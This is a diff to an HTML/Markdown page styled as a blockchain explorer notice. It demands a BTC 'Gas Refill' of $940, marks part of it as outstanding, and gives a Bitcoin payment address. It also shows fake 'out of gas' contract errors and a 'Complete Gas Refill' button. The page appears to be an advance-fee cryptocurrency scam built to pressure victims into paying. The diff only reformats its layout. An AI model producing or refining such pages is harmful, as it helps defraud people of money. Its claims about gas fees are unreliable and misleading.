@@ -27,26 +27,19 @@ Hash ID:    **8b214f6839d869d6ab80[39Kn3XYPUmrud...qHwnUYg6uvz]**
 <img src="IMG_9146.jpeg" alt="ethscan Logo" width="700" />
 
 
-<span style="color: Red;"> ***Gas Refill:     0.00976176 BTC [$940 usd]*** </span>
-
-
-| <span style="color: Blue;"> **Gas Recevied**    ~~$301 PAID~~ </span>                  | </span> <span style="color: Red;"> ~~$639~~ CURRENTLY OUTSTANDING ⏳ </span> |
+| <span style="color: Red;"> ***⛽️Gas Refill: </span> | <span style="color: Red;"> 0.00976176 BTC [$940 usd]*** </span>|
 |---------------------------|---------------------------|
-|  **Pay ID:**              | bc1q08mp7f3wdvpav0fkjy8reun6wtzulrc999jsls |
-
-
-
-
-
-
-
+| <span style="color: Blue;"> **Gas Recevied**    ~~$301 PAID~~ </span> | </span> <span style="color: Red;"> ~~$639~~ CURRENTLY OUTSTANDING ⏳ </span> |
+| **Pay ID:**               | bc1q08mp7f3wdvpav0fkjy8reun6wtzulrc999jsls |
 <img src="IMG_8518.jpeg" alt="blockchain Logo" width="30" />
+
+
 <form action="https://phantom.com/" method="get">
-<button type="submit"> Complete payment </button>
+<button type="submit"> ⚙️ Complete Gas Refill </button>
 
 
 
-<span style="color: Yellow;"> ~~**Warning! Error encountered during contract execution [Out of gas]**~~ ⚠️ </span>
+* <span style="color: Yellow;"> ~~**Warning! Error encountered during contract execution [Out of gas]**~~ ⚠️ </span>
 
 
 
@@ -58,7 +51,7 @@ Hash ID:    **8b214f6839d869d6ab80[39Kn3XYPUmrud...qHwnUYg6uvz]**
 
 
 
-     ⛽️ Alert Error: VM Exception while processing transaction out of gas
+*     ⛽️ Alert Error: VM Exception while processing transaction out of gas
 
 
 
@@ -66,7 +59,7 @@ Hash ID:    **8b214f6839d869d6ab80[39Kn3XYPUmrud...qHwnUYg6uvz]**
 
 
 
-<span style="color: Red;">**SUMMARY**The __"out of gas"__ error occurs when all the gas you allotted for the transaction is consumed before the transaction could complete!</span>
+* <span style="color: Red;">**SUMMARY**The __"out of gas"__ error occurs when all the gas you allotted for the transaction is consumed before the transaction could complete!</span>
 
 
 
